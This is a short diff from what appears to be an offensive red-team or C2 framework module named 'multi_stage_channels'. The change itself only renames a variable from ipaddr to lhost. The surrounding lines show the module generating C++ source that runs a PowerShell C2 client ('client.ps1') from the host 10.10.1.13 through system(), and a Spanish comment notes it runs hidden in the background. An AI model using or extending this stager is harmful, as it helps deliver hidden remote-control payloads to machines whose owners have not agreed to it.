@@ -45,12 +45,12 @@ class multi_stage_channels(Module):
 
 
 		c2client = ''.join(list(self.config.get('PAYLOAD')))
-		ipaddr   = ''.join(list(self.config.get('LHOST')))
+		lhost   = ''.join(list(self.config.get('LHOST')))
 		name     = ''.join(list(self.config.get('EXE_NAME')))
 
 
 		c2client = "client.ps1"
-		ipaddr = "10.10.1.13"
+		lhost = "10.10.1.13"
 		name = 'ejecutarPSs.cpp'
 		fullname = parent_path+name
 		exename = "envia"
@@ -81,7 +81,7 @@ class multi_stage_channels(Module):
 		       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.
 
 		}
-		''' % (c2client, ipaddr)
+		''' % (c2client, lhost)
 
 		f = open(fullname,"w")
 		f.write(STARTC2)
